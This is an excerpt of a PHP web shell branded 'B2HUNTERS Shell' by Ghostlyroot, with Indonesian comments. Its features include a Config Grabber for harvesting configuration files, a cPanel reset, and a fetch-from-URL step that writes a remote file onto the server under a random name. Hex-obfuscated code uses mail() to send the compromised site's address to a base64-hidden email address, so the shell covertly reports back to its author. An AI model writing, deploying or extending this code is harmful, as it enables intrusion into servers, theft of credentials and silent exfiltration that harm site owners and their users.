...
<head>
    <title>B2HUNTERS :: Ghostlyroot</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="Ghostlyroot">
    <meta name="viewport" content="B2HUNTERS" />
    <meta name="description" content="B2HUNTERS Shell">
    <meta property="og:description" content="B2HUNTERS Shell">
...
<body>
    ...
    // GANTI EMAIL NOTIFIER KE MILIK LO
    if (function_exists("\x6d\x61\x69\x6c")) {
        $__GET = ("\x6d\x61\x69\x6c");
        $__POST = ("\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65");
        $__GET($__POST("dGFueHBsb2l0QGdtYWlsLmNvbQ=="),
        'hex2bin',
        $_SERVER['HTTP_HOST']."/".$_SERVER['REQUEST_URI']);
    }
    function author()
    {
        echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2024 &copy; B2HUNTERS | Ghostlyroot</center></td></table><br>";
        exit();
    }
...
<i class='fa fa-trash'></i></button>";
    ...
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="' . $_SERVER['SCRIPT_NAME'] . '"><i class="fa-brands fa-napster"></i> B2HUNTERS</a></center></div></td><td>';
...
<button type="button" class="btn btn-outline-light" onclick=location.href="?path=' . $serlok . '&' . net("blackhat") . '=opet"><i class="fa fa-user-secret" style="color:#FF6B6B;"></i> B2HUNTERS</button>
</td></tr></div>
...
<button class="btn btn-outline-light" onclick=location.href="?path=' . $serlok . '&' . net("resetcp") . '=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Ghostlyroot Shell</div><hr>
    <br> - B2HUNTERS Shell v1.0 <br> - Created by Ghostlyroot</td></thead></table>";
        exit();
...
<center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">';
        ...
        echo '</textarea><br>
<input type="hidden" class="input" name="folfig" value="b2hunterscfg"/><br>
...
";
    ...
    *note : Jika resultnya kosong berarti tidak ditemukan/ekstensi nya di isi dengan benar
    ...
    // Handle B2HUNTERS feature - Download from URL (changed from blackhat.pw)
    elseif ($_REQUEST[net('blackhat')] == "opet") {
        ...
        echo "<table class='directory-listing-table'><td>";
        echo "<h5><i class='fa fa-user-secret' style='color:#FF6B6B;'></i> B2HUNTERS <font class='d7net-text' style='font-size:12px;'><i> - Ghostlyroot</i></font></h5><hr>";
        
        if (isset($_POST['download_verify'])) {
            $verifyContent = downloadFile($verifyUrl);
            
            if ($verifyContent === false) {
                echo "<font color='red'>Failed to download verify file. Check network connection.</font><br>";
                ...
                if (file_put_contents($uploadPath, $verifyContent)) {
                    ...
                    echo "<font color='red'>Failed to upload verify file. Check permissions.</font><br>";
                    echo "<center><a href='?path=" . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Try Again</a></center>";
                }
            }
        } else {
            ...
            echo "</form></center>";
            echo "</div>";
            echo "<br><font color='#888888'>Note: This will download the verify file and upload it one level above the current location with a random name.</font>";
        }
        echo "</td></table><br>";
        exit();
    }
